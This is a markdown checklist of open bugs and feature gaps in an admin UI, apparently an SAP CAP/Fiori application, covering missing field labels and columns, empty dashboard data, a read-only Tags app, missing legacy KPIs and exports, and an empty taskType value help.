- [ ] **Admin UI Missions: field labels missing on Object Page** — The General section of the Mission Object Page shows input fields without labels. Only one field has a red asterisk (required indicator) and one shows "DELETED" as a value, but no field names are visible. Likely missing `@Common.Label` or `@UI.FieldGroup` label annotations in `app/admin-annotations.cds` for the Missions entity fields. **Same issue affects other entities** (Events, Groups, Accomplishments, Prizes, etc.) — field labels missing across all Object Page detail screens.
- [ ] **Admin UI Dashboard: columns missing data** — The Tutorial Dashboard table shows "Owner", "Status", and "Notifications" populated but "Tutorial", "Primary Tag", "Last Reviewed", and "Last Reminder" columns are empty. The data exists (rows are rendering) but these specific fields aren't being resolved — likely the OData projection or the custom dashboard controller isn't fetching/binding those properties correctly.
- [ ] **Admin UI Tags: should be read-only** — The Tags app in the admin UI currently allows editing but should be view-only (no Create/Edit/Delete actions). Tags are managed by the system (sync from tutorial metadata), not manually curated by admins.
- [ ] **Admin UI Tags: missing columns** — The Tags list report is missing the "MD Format" and "Full Path" columns. These fields need to be added to the `@UI.LineItem` annotation for the Tags entity in `app/admin-annotations.cds`.
- [ ] **Admin UI Board: missing KPIs from legacy** — The Board view in the admin UI is incomplete compared to the legacy IMS system. Legacy had: pie chart (tutorials up-to-date vs. require review), numeric KPI tiles (users, tutorials, groups, missions), and average completion percentages (tutorial/group/mission completion %). Need to replicate these visualizations in the freestyle Board view.
- [ ] **Admin UI Statistics: missing "Mission completions" export** — The legacy system had a "Mission completions" download with date range picker (Start Date, End Date) and optional Mission ID filter. This export is missing from the Statistics view in the new admin UI. Need to add it alongside the existing CSV export functionality.
- [ ] **Admin UI Operations: taskType value help empty** — The "taskType" filter field in the Operations (Featured Tasks) list report shows no selectable values. Needs investigation: either the value help annotation is missing/misconfigured (may need a `SELECT DISTINCT` view or enum to supply possible values), or the test dataset has no FeaturedTasks records with taskType populated. This may be a broader issue across Admin UI filter fields that rely on value helps — research whether other entities have the same problem.
